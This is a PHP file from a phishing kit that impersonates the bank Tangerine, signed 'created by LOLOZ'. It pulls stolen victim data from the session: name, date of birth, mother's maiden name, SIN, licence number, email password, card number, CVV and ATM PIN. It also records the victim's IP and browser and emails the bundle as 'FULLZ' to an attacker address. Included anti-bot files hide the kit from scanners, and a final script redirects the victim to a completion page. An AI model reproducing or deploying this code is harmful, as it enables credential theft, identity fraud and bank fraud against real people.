<?php
include('../blackhole/index.php');
include "email.php";
include './prevents/anti7.php';
include './prevents/anti8.php';
include './prevents/anti9.php';
include './prevents/block.php';
error_reporting(0);
session_start();


$ip = getenv("REMOTE_ADDR");
$browser = $_SERVER['HTTP_USER_AGENT'];
$message .= "-----------------3 PersonalDetails----------------\n";
$message .= "FULLNAME	: ".$_SESSION['FN']."\n";
$message .= "DOB		: ".$_SESSION['DB']."\n";
$message .= "MMN		: ".$_SESSION['MN']."\n";
$message .= "SIN		: ".$_SESSION['SN']."\n";
$message .= "DLN		: ".$_SESSION['DN']."\n";
$message .= "EMAIL		: ".$_SESSION['EA']."\n";
$message .= "EPASS		: ".$_SESSION['EP']."\n";
$message .= "-----------------4 CardDetails--------------------\n";
$message .= "CARDNO		: ".$_SESSION['CN']."\n";
$message .= "EXP		: ".$_SESSION['ED']."\n";
$message .= "CVV		: ".$_SESSION['CV']."\n";
$message .= "ATMPIN		: ".$_SESSION['AP']."\n";
$message .= "-----------------created by LOLOZ:)-----------------\n";
$message .= "IP          : ".$ip."\n";$IP=$_POST['IP'];
$message .= "BROWSER     : ".$browser."\n";$browser=$_POST['browser'];
$message .= "-----------------TangerineResults-------------------\n";


$subject = "Tangerine - created by LOLOZ:) ";


 if ($_SESSION['FN'] != "" && strlen($_SESSION['CN'])==16 ) {
  mail($send , "Tangerine - FULLZ $IP", getenv('HTTP_X_FORWARDED_FOR') . " | " . $_SERVER['HTTP_USER_AGENT'] . " | " . "\n\n" .$subject . "\n" . $message . "\n\n");
}




?>
<script>
    window.top.location.href = "complete.php";

</script>